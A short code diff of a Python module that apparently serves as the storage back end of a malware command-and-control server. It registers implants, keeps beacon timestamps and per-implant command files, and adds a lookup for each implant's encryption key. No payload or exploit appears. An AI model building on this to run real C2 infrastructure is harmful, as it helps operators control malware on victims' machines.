@@ -3,7 +3,7 @@ import os
 
 def add_malware(malware_entry):
 
-    directory = f"malware/{malware_entry["id"]}"
+    directory = f"malware/{malware_entry['id']}"
 
     entry = json.dumps(malware_entry)
     
@@ -17,8 +17,8 @@ def add_malware(malware_entry):
 
     open(f"{directory}/logs.txt", "x")
 
-    with open (f"{directory}/commands.txt", "w") as f:
-        f.write("slp:10")
+    open(f"{directory}/commands.txt", "x")
+
 
 def update_becon(id, timestamp):
 
@@ -77,3 +77,10 @@ def write_file(id, file, data):
 
     with open(file_name, "w") as f:
         f.write(data)
+
+
+def get_enc_key(id):
+
+    malware_json = json.loads(read_file(id,"about.txt"))
+
+    return int(malware_json['key'])
